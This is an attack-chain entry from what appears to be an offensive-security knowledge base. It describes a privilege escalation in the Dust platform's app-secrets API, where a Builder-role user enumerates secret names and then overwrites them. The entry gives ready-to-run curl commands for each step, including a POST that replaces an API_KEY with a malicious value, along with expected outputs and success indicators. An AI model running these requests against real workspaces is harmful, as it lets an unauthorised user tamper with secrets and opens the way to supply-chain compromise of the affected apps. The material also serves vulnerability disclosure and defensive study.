---
tags:
  - improper-access-control
  - privilege-escalation
  - secret-management
  - dust-app
type: attack_chain
tools: []
tactics:
  - '[[Privilege Escalation]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Enumerate-Secret-Names-as-Builder-User]]'
  - '[[procedures/Overwrite-or-Create-Secrets-as-Builder-User]]'
step_count: 2
techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Valid Accounts]]'
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:30:46.845Z'
description: >-
  Attack chain exploiting improper access control in Dust app secrets endpoints,
  allowing Builder role users to enumerate, create, and overwrite secrets,
  resulting in privilege escalation and potential supply chain attacks.
skill_level: intermediate
impact_level: high
id: 331356aa-61c0-4116-ae57-aa391630705f
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Valid Accounts]]'
  - '[[Account Discovery]]'
---
---

# Privilege Escalation in Dust App Secrets Management Leading to Unauthorized Secret Modification

Multi-stage attack chain demonstrating improper access control in Dust's secret management, enabling Builder users to list and modify secrets beyond their role permissions.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Enumerate Secrets] --> B[Modify Secrets]
    B --> C[Privilege Escalation & Tampering]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- Web browser or API client for session management

### Target Environment

- Dust application platform (Web)
- Access to a workspace with Builder role
- Valid session cookie (appSession)

### Initial Access Requirements

- Authenticated as Builder user in the target workspace
- Knowledge of workspace_id
- Network access to dust.tt API endpoints

## Detailed Attack Procedures

### Step 1: Enumerate Secret Names
procedure: [[procedures/Enumerate-Secret-Names-as-Builder-User]]

**Objective**: List all existing secret names in the workspace to identify targets for modification, exploiting lack of permission checks for GET requests.

**Instructions**: Authenticate as a Builder user and send a GET request to the secrets endpoint using [[commands/get-dust-app-secrets]] to retrieve the list of secrets.

```bash
curl -X GET "https://dust.tt/api/w/[workspace_id]/dust_app_secrets" -H "Cookie: [appSession]"
```

**Expected Output**: JSON response with array of secrets, showing names and masked values, e.g., {"secrets": [{"name":"API_KEY","value":"•••••••"}] }.

**Success Indicators**:
- Response contains list of secret names without errors
- Masks confirm values are hidden but names are exposed

### Step 2: Overwrite or Create Secrets
procedure: [[procedures/Overwrite-or-Create-Secrets-as-Builder-User]]

**Objective**: Create new secrets or silently overwrite existing ones by sending unauthorized POST requests, leading to tampering with app configurations and potential data compromise.

**Instructions**: Using a secret name identified from Step 1, send a POST request with [[commands/post-dust-app-secrets]] to overwrite or create a secret with malicious value.

```bash
curl -X POST "https://dust.tt/api/w/[workspace_id]/dust_app_secrets" \
  -H "Host: dust.tt" \
  -H "Content-Type: application/json" \
  -H "Cookie: [appSession]" \
  -d '{"name":"API_KEY","value":"malicious-value"}'
```

**Expected Output**: 200 OK response with no error, indicating silent overwrite or creation.

**Success Indicators**:
- No permission error returned
- Subsequent GET request shows updated/masked value for the secret
- Apps using the secret now reference the malicious value

## Attack Chain Summary

### Key Achievements

1. Discovery of all secret names without Viewer or Admin privileges
2. Unauthorized modification of sensitive secrets like API keys
3. Potential for supply chain attacks by injecting malicious configurations

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation
- [[Valid Accounts]] Valid Accounts
- [[Account Discovery]] Account Discovery

### MITRE ATT&CK Tactics

- [[Privilege Escalation]] Privilege Escalation
- [[Discovery]] Discovery

---

*Last updated: 2023-10-01T00:00:00Z*
